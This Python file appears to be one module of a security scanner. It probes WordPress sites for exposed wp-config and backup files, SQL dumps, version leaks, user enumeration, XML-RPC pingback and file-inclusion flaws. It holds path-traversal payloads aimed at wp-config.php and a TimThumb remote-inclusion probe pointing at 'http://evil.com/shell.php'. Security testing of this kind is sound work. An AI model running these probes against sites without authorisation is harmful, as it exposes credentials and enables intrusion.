"""WordPress-specific vulnerability scanner for known WordPress vulnerabilities and endpoints."""

import re
import requests
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, quote

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.response_validation import (
    fetch_soft_404_baseline,
    is_accessible_response,
    validate_resource_access,
)
from ..utils.wp_references import wordpress_core_references

import logging
logger = logging.getLogger(__name__)


class WordPressVulnerabilities(BaseScanner):
    """Comprehensive WordPress-specific vulnerability scanner."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE):
        """
        Initialize WordPress vulnerabilities scanner.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (defensive or offensive)
        """
        super().__init__(
            name="wordpress_vulnerabilities",
            command=None,  # No external command needed
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
        self.session.timeout = 10
    
    def is_available(self) -> bool:
        """WordPress vulnerabilities scanner is always available."""
        return True
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Run WordPress-specific vulnerability tests."""
        if self.scan_mode == ScanMode.DEFENSIVE:
            return []  # Only run in offensive mode
        
        findings = []
        
        # Check if this is a WordPress site first
        if not self._is_wordpress_site(target.url):
            return findings

        fetch_soft_404_baseline(self.session, target.url)
        
        # Run comprehensive WordPress vulnerability tests
        findings.extend(self._test_wp_config_exposure(target.url))
        findings.extend(self._test_wp_load_inclusion(target.url))
        findings.extend(self._test_backup_files(target.url))
        findings.extend(self._test_database_exposure(target.url))
        findings.extend(self._test_version_disclosure(target.url))
        findings.extend(self._test_user_enumeration(target.url))
        findings.extend(self._test_password_reset_vulnerabilities(target.url))
        findings.extend(self._test_timthumb_vulnerabilities(target.url))
        findings.extend(self._test_admin_ajax_vulnerabilities(target.url))
        findings.extend(self._test_wp_cron_vulnerabilities(target.url))
        findings.extend(self._test_plugin_theme_file_inclusion(target.url))
        findings.extend(self._test_upload_directory_traversal(target.url))
        findings.extend(self._test_pingback_attacks(target.url))
        
        return findings
    
    def _is_wordpress_site(self, url: str) -> bool:
        """Check if the target is a WordPress site."""
        try:
            response = self.session.get(url, timeout=10)
            content = response.text.lower()
            
            wp_indicators = [
                'wp-content',
                'wp-includes',
                'wp-admin',
                'wordpress',
                '/wp-json/',
            ]
            
            if any(indicator in content for indicator in wp_indicators):
                return True
            
            # Check wp-json endpoint
            try:
                wp_json_url = urljoin(url, '/wp-json/')
                wp_json_response = self.session.get(wp_json_url, timeout=5)
                if wp_json_response.status_code == 200:
                    return True
            except:
                pass
            
            return False
        except:
            return False
    
    def _test_wp_config_exposure(self, url: str) -> List[Finding]:
        """Test for wp-config.php exposure and related files."""
        findings = []
        
        wp_config_variants = [
            '/wp-config.php',
            '/wp-config.php.bak',
            '/wp-config.php.old',
            '/wp-config.php.save',
            '/wp-config.php.swp',
            '/wp-config.php~',
            '/wp-config.txt',
            '/wp-config.inc.php',
            '/wp-config-sample.php',
            '/wp-config-backup.php',
            '/wp-config.orig',
            '/wp-config.original',
        ]
        
        for config_file in wp_config_variants:
            try:
                test_url = urljoin(url, config_file)
                response = self.session.get(test_url, timeout=5)

                if validate_resource_access(
                    response, config_file, session=self.session, base_url=url
                ):
                    content = response.text
                    if 'DB_NAME' in content or 'DB_PASSWORD' in content or 'DB_USER' in content:
                        findings.append(Finding(
                            title=f"WordPress Configuration File Exposed: {config_file}",
                            description=f"The WordPress configuration file '{config_file}' is publicly accessible. "
                                      f"This file contains database credentials, authentication keys, and other sensitive information. "
                                      f"Exposure of this file can lead to complete site compromise.",
                            severity=FindingSeverity.CRITICAL,
                            category=FindingCategory.INFORMATION_DISCLOSURE,
                            source_scanner="wordpress_vulnerabilities",
                            source_id=f"wp_config_{config_file.replace('/', '_')}",
                            url=test_url,
                            remediation=f"Immediately remove or restrict access to '{config_file}'. "
                                       f"Ensure wp-config.php is not accessible via web. "
                                       f"Use .htaccess rules or web server configuration to block access. "
                                       f"Rotate all database credentials and authentication keys if exposed.",
                            metadata={
                                "file": config_file,
                                "status_code": 200,
                                "contains_credentials": True,
                            },
                            references=[
                                "https://wordpress.org/support/article/editing-wp-config-php/",
                            ],
                        ))
            except:
                continue
        
        return findings
    
    def _test_wp_load_inclusion(self, url: str) -> List[Finding]:
        """Test for WordPress file inclusion vulnerabilities (LFI/RFI)."""
        findings = []
        
        # Test common file inclusion parameters
        inclusion_params = ['file', 'page', 'include', 'path', 'template', 'view', 'load']
        
        # WordPress files that can be included
        wp_files = [
            '/wp-load.php',
            '/wp-config.php',
            '/wp-blog-header.php',
            '/wp-includes/wp-db.php',
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for param in inclusion_params:
            for wp_file in wp_files:
                # Test various path traversal payloads
                payloads = [
                    f"../../..{wp_file}",
                    f"....//....//....//{wp_file.replace('/', '')}",
                    f"..%2F..%2F..%2F{wp_file.replace('/', '%2F')}",
                ]
                
                for payload in payloads:
                    try:
                        test_url = f"{base_url}?{param}={quote(payload)}"
                        response = self.session.get(test_url, timeout=5)
                        
                        if response.status_code == 200:
                            content = response.text
                            # Check for WordPress-specific content
                            if 'DB_NAME' in content or 'wp-load.php' in content or 'wp-config' in content:
                                findings.append(Finding(
                                    title=f"WordPress File Inclusion Vulnerability in {param} Parameter",
                                    description=f"Local File Inclusion (LFI) vulnerability detected in the '{param}' parameter. "
                                              f"Successfully included WordPress core file '{wp_file}'. "
                                              f"This can lead to information disclosure and potentially Remote Code Execution.",
                                    severity=FindingSeverity.HIGH,
                                    category=FindingCategory.EXPLOITATION,
                                    source_scanner="wordpress_vulnerabilities",
                                    source_id=f"wp_lfi_{param}",
                                    url=test_url,
                                    remediation=f"Sanitize and validate the '{param}' parameter. "
                                               f"Use whitelist of allowed files. "
                                               f"Prevent directory traversal sequences (../). "
                                               f"Store sensitive files outside web root.",
                                    metadata={
                                        "parameter": param,
                                        "included_file": wp_file,
                                        "payload": payload,
                                        "vulnerable": True,
                                    },
                                    references=[
                                        "https://owasp.org/www-community/attacks/Path_Traversal",
                                    ],
                                ))
                                break  # Found vulnerability, no need to test more payloads
                    except:
                        continue
        
        return findings
    
    def _test_backup_files(self, url: str) -> List[Finding]:
        """Test for WordPress backup files."""
        findings = []
        
        backup_files = [
            '/wp-content/backup-db/',
            '/wp-content/backups/',
            '/wp-content/backup/',
            '/backup/',
            '/backups/',
            '/wp-content/uploads/backup/',
            '/wp-content/plugins/backup/',
            '/wp-content/themes/backup/',
            '/wp-content/backup-*.sql',
            '/wp-content/*.sql',
            '/wp-content/*.sql.gz',
            '/wp-content/*.tar.gz',
            '/wp-content/*.zip',
            '/wp-content/*.bak',
        ]
        
        for backup_path in backup_files:
            try:
                test_url = urljoin(url, backup_path)
                response = self.session.get(test_url, timeout=5)

                if validate_resource_access(
                    response, backup_path, session=self.session, base_url=url
                ):
                    content = response.text.lower()
                    backup_indicators = [
                        'index of /', 'directory listing', 'parent directory',
                        '.sql', 'mysqldump', 'database dump', 'wp_users',
                    ]
                    if any(indicator in content for indicator in backup_indicators):
                        findings.append(Finding(
                            title=f"WordPress Backup File/Directory Exposed: {backup_path}",
                            description=f"Backup file or directory '{backup_path}' is publicly accessible. "
                                      f"Backup files may contain database dumps, configuration files, or other sensitive information.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.INFORMATION_DISCLOSURE,
                            source_scanner="wordpress_vulnerabilities",
                            source_id=f"wp_backup_{backup_path.replace('/', '_')}",
                            url=test_url,
                            remediation=f"Remove backup files from web-accessible directories. "
                                       f"Store backups outside the web root. "
                                       f"Use .htaccess to block access to backup directories.",
                            metadata={
                                "backup_path": backup_path,
                                "status_code": 200,
                            },
                        ))
            except:
                continue
        
        return findings
    
    def _test_database_exposure(self, url: str) -> List[Finding]:
        """Test for database file exposure."""
        findings = []
        
        db_files = [
            '/wp-content/database.sql',
            '/wp-content/db.sql',
            '/wp-content/backup.sql',
            '/wp-content/*.sql',
            '/database.sql',
            '/db.sql',
            '/backup.sql',
            '/sql/dump.sql',
        ]
        
        for db_file in db_files:
            try:
                test_url = urljoin(url, db_file)
                response = self.session.get(test_url, timeout=5)

                if validate_resource_access(
                    response, db_file, session=self.session, base_url=url
                ):
                    content = response.text
                    if 'CREATE TABLE' in content or 'INSERT INTO' in content or 'wp_users' in content:
                        findings.append(Finding(
                            title=f"Database Dump File Exposed: {db_file}",
                            description=f"Database dump file '{db_file}' is publicly accessible. "
                                      f"This file contains the entire database including user credentials, posts, and other sensitive data.",
                            severity=FindingSeverity.CRITICAL,
                            category=FindingCategory.INFORMATION_DISCLOSURE,
                            source_scanner="wordpress_vulnerabilities",
                            source_id=f"wp_db_{db_file.replace('/', '_')}",
                            url=test_url,
                            remediation=f"Immediately remove '{db_file}' from the web server. "
                                       f"Store database backups outside the web root. "
                                       f"Change all user passwords if the dump contains hashed passwords.",
                            metadata={
                                "db_file": db_file,
                                "status_code": 200,
                                "contains_database": True,
                            },
                        ))
            except:
                continue
        
        return findings
    
    def _test_version_disclosure(self, url: str) -> List[Finding]:
        """Test for WordPress version disclosure and known vulnerabilities."""
        findings = []
        
        # Check readme.html for version
        try:
            readme_url = urljoin(url, '/readme.html')
            response = self.session.get(readme_url, timeout=5)
            if validate_resource_access(
                response, "/readme.html", session=self.session, base_url=url
            ):
                version_match = re.search(r'Version\s+([\d.]+)', response.text, re.IGNORECASE)
                if version_match:
                    version = version_match.group(1)
                    findings.append(Finding(
                        title=f"WordPress Version Disclosed: {version}",
                        description=f"WordPress version {version} is disclosed in readme.html. "
                                  f"Version disclosure helps attackers identify known vulnerabilities for this version.",
                        severity=FindingSeverity.LOW,
                        category=FindingCategory.INFORMATION_DISCLOSURE,
                        source_scanner="wordpress_vulnerabilities",
                        source_id="wp_version_readme",
                        url=readme_url,
                        remediation="Remove or restrict access to readme.html. Consider removing version information from all public files.",
                        references=wordpress_core_references(version),
                        metadata={
                            "version": version,
                            "source": "readme.html",
                        },
                    ))
        except:
            pass
        
        # Check generator meta tag
        try:
            response = self.session.get(url, timeout=10)
            if is_accessible_response(response):
                generator_match = re.search(r'<meta\s+name=["\']generator["\'][^>]*content=["\']WordPress\s+([\d.]+)["\']', response.text, re.IGNORECASE)
                if generator_match:
                    version = generator_match.group(1)
                    findings.append(Finding(
                        title=f"WordPress Version Disclosed in Meta Tag: {version}",
                        description=f"WordPress version {version} is disclosed in the HTML generator meta tag. "
                                  f"This information can help attackers identify known vulnerabilities.",
                        severity=FindingSeverity.LOW,
                        category=FindingCategory.INFORMATION_DISCLOSURE,
                        source_scanner="wordpress_vulnerabilities",
                        source_id="wp_version_meta",
                        url=url,
                        remediation="Remove WordPress version from generator meta tag using a plugin or custom code.",
                        references=wordpress_core_references(version),
                        metadata={
                            "version": version,
                            "source": "generator_meta",
                        },
                    ))
        except:
            pass
        
        return findings
    
    def _test_user_enumeration(self, url: str) -> List[Finding]:
        """Test for WordPress user enumeration vulnerabilities."""
        findings = []
        
        # Test author enumeration
        for author_id in range(1, 11):  # Test first 10 author IDs
            try:
                author_url = urljoin(url, f'/?author={author_id}')
                response = self.session.get(author_url, timeout=5, allow_redirects=False)
                
                # If redirects to author page, user exists
                if response.status_code in [301, 302, 200]:
                    location = response.headers.get('Location', '')
                    if f'/author/' in location or f'?author={author_id}' in response.url:
                        # Check if we can get author info
                        if response.status_code == 200 or location:
                            findings.append(Finding(
                                title="WordPress User Enumeration via Author Parameter",
                                description=f"User enumeration is possible via the 'author' parameter. "
                                          f"Author ID {author_id} exists and can be enumerated. "
                                          f"This allows attackers to discover usernames for brute-force attacks.",
                                severity=FindingSeverity.MEDIUM,
                                category=FindingCategory.INFORMATION_DISCLOSURE,
                                source_scanner="wordpress_vulnerabilities",
                                source_id=f"wp_user_enum_author_{author_id}",
                                url=author_url,
                                remediation="Disable author archives or use plugins to prevent user enumeration. "
                                           f"Block or restrict access to ?author= parameter.",
                                metadata={
                                    "author_id": author_id,
                                    "enumeration_method": "author_parameter",
                                },
                            ))
                            break  # Found enumeration, no need to test more
            except:
                continue
        
        return findings
    
    def _test_password_reset_vulnerabilities(self, url: str) -> List[Finding]:
        """Test for WordPress password reset vulnerabilities."""
        findings = []
        
        # Test password reset endpoint
        try:
            reset_url = urljoin(url, '/wp-login.php?action=lostpassword')
            response = self.session.get(reset_url, timeout=5)
            
            if response.status_code == 200:
                # Check if it reveals whether user exists
                # Submit a request for a non-existent user
                test_data = {
                    'user_login': 'nonexistentuser12345xyz',
                }
                test_response = self.session.post(reset_url, data=test_data, timeout=5)
                
                # Then test with a common username
                common_data = {
                    'user_login': 'admin',
                }
                common_response = self.session.post(reset_url, data=common_data, timeout=5)
                
                # Compare responses - if different, user enumeration possible
                if test_response.text != common_response.text:
                    # Check for different error messages
                    if 'invalid' in test_response.text.lower() and 'invalid' not in common_response.text.lower():
                        findings.append(Finding(
                            title="WordPress Password Reset User Enumeration",
                            description="The password reset functionality allows user enumeration. "
                                      "Different error messages are returned for existing vs non-existent users, "
                                      "allowing attackers to discover valid usernames.",
                            severity=FindingSeverity.MEDIUM,
                            category=FindingCategory.INFORMATION_DISCLOSURE,
                            source_scanner="wordpress_vulnerabilities",
                            source_id="wp_password_reset_enum",
                            url=reset_url,
                            remediation="Use consistent error messages for password reset requests. "
                                       "Do not reveal whether a username/email exists in the system.",
                            metadata={
                                "vulnerable": True,
                                "enumeration_method": "password_reset",
                            },
                        ))
        except:
            pass
        
        return findings
    
    def _test_timthumb_vulnerabilities(self, url: str) -> List[Finding]:
        """Test for TimThumb vulnerabilities (common in WordPress themes)."""
        findings = []
        
        timthumb_paths = [
            '/wp-content/themes/twenty*/timthumb.php',
            '/wp-content/themes/*/timthumb.php',
            '/timthumb.php',
            '/tools/timthumb.php',
            '/inc/timthumb.php',
        ]
        
        for path in timthumb_paths:
            # Test common TimThumb vulnerabilities
            try:
                # Try to find actual timthumb.php files
                test_url = urljoin(url, path.replace('*', 'twentyten'))  # Try common theme
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200 and 'timthumb' in response.text.lower():
                    # Test for remote file inclusion vulnerability
                    test_params = {
                        'src': 'http://evil.com/shell.php',
                        'w': '100',
                        'h': '100',
                    }
                    vuln_response = self.session.get(test_url, params=test_params, timeout=5)
                    
                    if vuln_response.status_code == 200:
                        findings.append(Finding(
                            title=f"TimThumb Vulnerability Detected: {path}",
                            description=f"TimThumb script found at '{path}'. "
                                      f"Older versions of TimThumb are vulnerable to remote file inclusion and arbitrary file upload. "
                                      f"This can lead to remote code execution.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.EXPLOITATION,
                            source_scanner="wordpress_vulnerabilities",
                            source_id=f"wp_timthumb_{path.replace('/', '_')}",
                            url=test_url,
                            remediation="Update TimThumb to the latest version or remove it if not needed. "
                                       "Ensure TimThumb is configured with proper security settings.",
                            metadata={
                                "timthumb_path": path,
                                "vulnerable": True,
                            },
                            references=[
                                "https://www.exploit-db.com/exploits/17602",
                            ],
                        ))
            except:
                continue
        
        return findings
    
    def _test_admin_ajax_vulnerabilities(self, url: str) -> List[Finding]:
        """Test WordPress admin-ajax.php for vulnerabilities."""
        findings = []
        
        try:
            ajax_url = urljoin(url, '/wp-admin/admin-ajax.php')
            response = self.session.get(ajax_url, timeout=5)

            if is_accessible_response(response):
                body = response.text.strip()
                # Real admin-ajax.php usually returns 0, -1, or JSON — not HTML error pages.
                if body in ('0', '-1') or body.startswith('{') or body.startswith('['):
                    findings.append(Finding(
                        title="WordPress admin-ajax.php Endpoint Exposed",
                        description="The WordPress admin-ajax.php endpoint is accessible. "
                                  "While this is normal, it can be used for various attacks including "
                                  "CSRF, unauthorized actions, and information disclosure if not properly secured.",
                        severity=FindingSeverity.LOW,
                        category=FindingCategory.EXPOSED_ENDPOINT,
                        source_scanner="wordpress_vulnerabilities",
                        source_id="wp_admin_ajax",
                        url=ajax_url,
                        remediation="Ensure admin-ajax.php actions require proper authentication and nonces. "
                                   "Implement rate limiting and validate all inputs.",
                        metadata={
                            "endpoint": ajax_url,
                            "status_code": 200,
                        },
                    ))
        except:
            pass
        
        return findings
    
    def _test_wp_cron_vulnerabilities(self, url: str) -> List[Finding]:
        """Test WordPress wp-cron.php for vulnerabilities."""
        findings = []
        
        try:
            cron_url = urljoin(url, '/wp-cron.php')
            response = self.session.get(cron_url, timeout=5)

            if is_accessible_response(response, min_content_length=0):
                body = response.text.strip()
                if not body or body == '0':
                    findings.append(Finding(
                        title="WordPress wp-cron.php Endpoint Accessible",
                        description="The WordPress wp-cron.php endpoint is accessible. "
                                  "This endpoint can be abused for DoS attacks if triggered excessively. "
                                  "Consider disabling wp-cron and using real cron jobs instead.",
                        severity=FindingSeverity.LOW,
                        category=FindingCategory.EXPOSED_ENDPOINT,
                        source_scanner="wordpress_vulnerabilities",
                        source_id="wp_cron",
                        url=cron_url,
                        remediation="Disable wp-cron.php and use real cron jobs. "
                                   "Add define('DISABLE_WP_CRON', true); to wp-config.php "
                                   "and set up a real cron job to run wp-cron.php.",
                        metadata={
                            "endpoint": cron_url,
                            "status_code": 200,
                        },
                    ))
        except:
            pass
        
        return findings
    
    def _test_plugin_theme_file_inclusion(self, url: str) -> List[Finding]:
        """Test for plugin/theme file inclusion vulnerabilities."""
        findings = []
        
        # Common vulnerable plugin/theme file inclusion patterns
        inclusion_tests = [
            {
                'param': 'file',
                'payload': '../../wp-config.php',
                'description': 'Path traversal to wp-config.php',
            },
            {
                'param': 'include',
                'payload': '/wp-content/plugins/../../wp-config.php',
                'description': 'Plugin directory traversal',
            },
        ]
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for test in inclusion_tests:
            try:
                test_url = f"{base_url}?{test['param']}={quote(test['payload'])}"
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    content = response.text
                    if 'DB_NAME' in content or 'wp-config' in content:
                        findings.append(Finding(
                            title=f"WordPress Plugin/Theme File Inclusion in {test['param']}",
                            description=f"File inclusion vulnerability detected. {test['description']}. "
                                      f"This can lead to information disclosure and remote code execution.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.EXPLOITATION,
                            source_scanner="wordpress_vulnerabilities",
                            source_id=f"wp_plugin_theme_lfi_{test['param']}",
                            url=test_url,
                            remediation=f"Sanitize and validate the '{test['param']}' parameter. "
                                       f"Use whitelist of allowed files. Prevent directory traversal.",
                            metadata={
                                "parameter": test['param'],
                                "payload": test['payload'],
                                "vulnerable": True,
                            },
                        ))
            except:
                continue
        
        return findings
    
    def _test_upload_directory_traversal(self, url: str) -> List[Finding]:
        """Test for directory traversal in WordPress uploads."""
        findings = []
        
        # Test upload directory for path traversal
        upload_urls = [
            urljoin(url, '/wp-content/uploads/'),
            urljoin(url, '/wp-content/uploads/../wp-config.php'),
            urljoin(url, '/wp-content/uploads/../../wp-config.php'),
        ]
        
        for test_url in upload_urls:
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200:
                    content = response.text
                    if 'DB_NAME' in content or 'wp-config' in content:
                        findings.append(Finding(
                            title="WordPress Upload Directory Traversal",
                            description="Directory traversal vulnerability in WordPress uploads directory. "
                                      "Can access files outside the uploads directory, including wp-config.php.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.EXPLOITATION,
                            source_scanner="wordpress_vulnerabilities",
                            source_id="wp_upload_traversal",
                            url=test_url,
                            remediation="Restrict access to uploads directory. "
                                       "Prevent directory traversal in file paths. "
                                       "Use proper file path validation.",
                            metadata={
                                "vulnerable": True,
                                "test_url": test_url,
                            },
                        ))
                        break
            except:
                continue
        
        return findings
    
    def _test_pingback_attacks(self, url: str) -> List[Finding]:
        """Test for XML-RPC pingback vulnerabilities."""
        findings = []
        
        try:
            xmlrpc_url = urljoin(url, '/xmlrpc.php')
            response = self.session.post(xmlrpc_url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>', 
                                       headers={'Content-Type': 'text/xml'}, timeout=5)
            
            if response.status_code == 200 and 'pingback' in response.text.lower():
                findings.append(Finding(
                    title="WordPress XML-RPC Pingback Enabled",
                    description="XML-RPC pingback functionality is enabled. "
                              "Pingback can be abused for SSRF (Server-Side Request Forgery) attacks, "
                              "allowing attackers to scan internal networks or perform port scanning.",
                    severity=FindingSeverity.MEDIUM,
                    category=FindingCategory.EXPLOITATION,
                    source_scanner="wordpress_vulnerabilities",
                    source_id="wp_pingback",
                    url=xmlrpc_url,
                    remediation="Disable XML-RPC if not needed. "
                               "Add define('XMLRPC_ENABLED', false); to wp-config.php. "
                               "Or use a security plugin to disable pingbacks.",
                    metadata={
                        "endpoint": xmlrpc_url,
                        "pingback_enabled": True,
                    },
                    references=[
                        "https://wordpress.org/support/article/wordpress-backups/",
                    ],
                ))
        except:
            pass
        
        return findings

